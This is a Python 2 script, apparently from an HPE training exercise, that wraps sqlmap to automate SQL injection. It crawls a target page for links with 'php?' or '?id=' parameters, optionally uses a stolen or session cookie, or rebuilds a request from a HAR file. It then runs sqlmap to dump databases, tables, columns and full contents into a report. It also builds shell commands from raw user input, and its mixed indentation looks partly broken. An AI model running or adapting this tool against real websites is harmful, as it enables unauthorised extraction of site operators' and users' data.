import json
import requests
import bs4
import os
import re

print("HPE CTY SQLMAP AUTOMATION")


print("""GET OR POST
	1. GET
	2. POST	
	""")
choose_get_post = int(input())

if choose_get_post == 1:
	url = raw_input("Enter a sql_url: ")  # for sql url
	print("The URL Entered is: ",url)
	res = requests.get(url)
	#print(res.text)
	soup = bs4.BeautifulSoup(res.text, 'html5lib')
	main = raw_input("Enter the main URL if any: ")

	list1=[]
	for link in soup.find_all('a',href=True):
		if main in link['href']:
			list1.append(link['href'])
		    	#print(link['href'])
		else:
		    list1.append(main+link['href'])
		    #print(main+link['href'])
	list2=[]

	for i in list1:
		if "php?" in i:
			list2.append(i)
	for i in list1:
		if "?id=" in i:
			list2.append(i)
	#print(list2)
	print(" ")
	print("choose an URL: ")
	print("Your option are :")
	for i in list2:
		print(i)
	print(" ")


	url = raw_input("Enter the choosen sql_url: ")  # for sql url
	print(" ")
	cookie = raw_input("Enter cookie of the website (optional) : ")

	level=1
	risk=1

	level = raw_input("Enter the level (integer 1-5) : ")

	risk = raw_input("Enter the risk (integer 1-3) : ")


	if cookie == "":

		#os.system("sqlmap -v 2 " + "-u " + url + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dbs --tables --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")

		def database():
		    os.system("sqlmap " + "-u " + url + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


		def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-u " + url + " --tables" + " --level=" + level + " --risk=" + risk)


		'''
		def col():
		    d_name = input("Enter a database name: ")
		    t_nmae = input("Enter a tables name: ")
		    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
		'''

		def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-u " + url + " --columns" + " --level=" + level + " --risk=" + risk)

		def a_dump():
		    os.system("sqlmap " + "-u " + url + " --dump" + " --level=" + level + " --risk=" + risk)

		def report():
		    os.system("sqlmap -v 2 " + "-u " + url + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Desktop/scan_out.txt","a+") 
		    report = open("/home/kali/Desktop/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break
		
		choose = 0
		while choose!=7:
			print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report
		    7. Exit
		    """)
			choose = int(input("Enter a number: "))
			if choose == 1:
				database()
			elif choose == 2:
				tables()
			elif choose == 3:
				col_dump()
			elif choose == 4:
				a_dump()
			elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
			elif choose == 6:
				report()
			elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
			else:
				print("wrong input please Give value Between 1 and 7 !!")


	else:
		
		cookie = "\"" + cookie + "\""
		url = "\"" + url + "\""
		
		#os.system("sqlmap -v 2 " + "-u " + url + " --cookie=" + cookie + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dbs --tables --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")


		def database():
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


		def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --tables" + " --level=" + level + " --risk=" + risk)


		'''
		def col():
		    d_name = input("Enter a database name: ")
		    t_nmae = input("Enter a tables name: ")
		    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
		'''

		def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --columns" + " --level=" + level + " --risk=" + risk)

		def a_dump():
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dump" + " --level=" + level + " --risk=" + risk)
		
		def report():
		    os.system("sqlmap -v 2 " + "-u " + url + " --cookie=" + cookie + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Desktop/scan_out.txt","a+") 
		    report = open("/home/kali/Desktop/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break
		choose = 0
		while choose!=7:
			print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report            
		    7. exit
		    """)
			choose = int(input("Enter a number: "))
			if choose == 1:
				database()
			elif choose == 2:
				tables()
			elif choose == 3:
				col_dump()
			elif choose == 4:
				a_dump()
			elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
			elif choose == 6:
				report()
			elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
			else:
				print("wrong input please Give value Between 1 and 7 !!")
		

else:
	class JSONParser(object):

	    def __init__(self, json_file):
		self.json_file = json_file
		self.data = {}

	    def parse_dict_or_list(self, key, d):
		if isinstance(d, list):
		    for sub_dict in d:
		        if key in sub_dict:
		            return sub_dict[key]
		    return None
		else:
		    if key in d:
		        return d[key]
		    else:
		        None

	    def make_query(self, query_list):
		working_level = self.data
		for item in query_list:
		    working_level = self.parse_dict_or_list(item, working_level)
		    if working_level == None:
		        return None
		return working_level

	    def load_json(self):
		with open(self.json_file) as data_file:
		    self.data = json.load(data_file)

	    def query(self, query_string):
		self.load_json()
		result = self.make_query(query_string.split('/'))
		return result
	
	print("please enter the file location ")
	file_name=raw_input()
	#old_file = open(file_name)
	#new_file = open("/home/kali/Downloads/new_file.json","a+")
	#reading_old_file = old_file.read()
	#new_file.write(reading_old_file)
	
	
	p = JSONParser(file_name)
	result = p.query('log/entries/request/headers')
	method = p.query('log/entries/request/method')
	url = p.query('log/entries/request/url')
	http = p.query('log/entries/request/httpVersion')

	#print(result)
	#result = p.query("ABC/DEF/OverAllHealth/PowerSupplies/Status")
	#print(result)

	new_json = open("/home/kali/Downloads/new_json.txt","a+")

	new_json.write((method))
	new_json.write(" ")
	new_json.write((url))
	new_json.write(" ")
	new_json.write((http))

	new_json.write('\n')

	result1 = str(result)
	result1 = result1.replace("{u'name': u","")
	result1 = result1.replace("}","")
	result1 = result1.replace("[","")
	result1 = result1.replace("]","")
	result1 = result1.replace(", u'value':","")
	result1 = result1.replace("u'","")
	result1 = result1.replace("'","")

	result1 = result1.replace("Host","Host:")
	#result1 = result1.replace("User-Agent","User-Agent:")
	#result1 = result1.replace("Accept","Accept:")
	#result1 = result1.replace("Accept-Language","Accept-Language:")
	#result1 = result1.replace("Accept-Encoding","Accept-Encoding:")
	#result1 = result1.replace("Connection","Connection:")
	#result1 = result1.replace("Referer","Referer:")
	#result1 = result1.replace("Cookie","Cookie:")
	#result1 = result1.replace("Upgrade-Insecure-Requests","Upgrade-Insecure-Requests:")


	find_user_agent = re.search(r"User-Agent",result1)
	find_Accept = re.search(r"Accept",result1)
	find_Accept_Language = re.search(r"Accept-Language",result1)
	find_Accept_Encoding = re.search(r"Accept-Encoding",result1)
	find_Connection = re.search(r"Connection",result1)
	find_Referer = re.search(r"Referer",result1)
	find_Cookie = re.search(r"Cookie",result1)
	find_Upgrade_Insecure_Requests = re.search(r"Upgrade-Insecure-Requests",result1)



	result2 = result1[:find_user_agent.span()[0]-2] + '\n' + 'User-Agent:' + result1[find_user_agent.span()[1]:find_Accept.span()[0]-2] + "\n" + "Accept:" + result1[find_Accept.span()[1]:find_Accept_Language.span()[0]-2] + "\n" + "Accept-Language:" + result1[find_Accept_Language.span()[1]:find_Accept_Encoding.span()[0]-2] + "\n" + "Accept-Encoding:" + result1[find_Accept_Encoding.span()[1]:find_Connection.span()[0]-2] + "\n" + "Connection:" + result1[find_Connection.span()[1]:find_Referer.span()[0]-2] + "\n" + "Referer:" + result1[find_Referer.span()[1]:find_Cookie.span()[0]-2] + "\n" + "Cookie:" + result1[find_Cookie.span()[1]:find_Upgrade_Insecure_Requests.span()[0]-2] + "\n" + "Upgrade-Insecure-Requests:" + result1[find_Upgrade_Insecure_Requests.span()[1]:]									      

	new_json.write((result2))
	
	level=1
	risk=1

	level = raw_input("Enter the level (integer 1-5) : ")

	risk = raw_input("Enter the risk (integer 1-3) : ")
	
	def database():
		    os.system("sqlmap " + "-r " + " new_json.txt" + " -p" +  " id" + " -dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


	def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-r " + " new_json.txt" + " -p" +  " id" + " --tables" + " --level=" + level + " --risk=" + risk)


	def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-r " + " new_json.txt" + " -p" +  " id" + " --dump --columns" + " --level=" + level + " --risk=" + risk)

	def a_dump():
		    os.system("sqlmap " + "-r " + " new_json.txt" + " -p" +  " id" + " --dump --level=" + level + " --risk=" + risk)

	def report():
		    os.system("sqlmap " + "-r " + " new_json.txt" + " -p" +  " id" + " --dump --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Desktop/scan_out.txt","a+") 
		    report = open("/home/kali/Desktop/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break

		
	choose = 0
	while choose!=7:
		print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report            
		    7. exit
		    """)
		choose = int(input("Enter a number: "))
		if choose == 1:
				database()
		elif choose == 2:
				tables()
		elif choose == 3:
				col_dump()
		elif choose == 4:
				a_dump()
		elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
		elif choose == 6:
				report()
		elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
		else:
				print("wrong input please Give value Between 1 and 7 !!")		
	
	








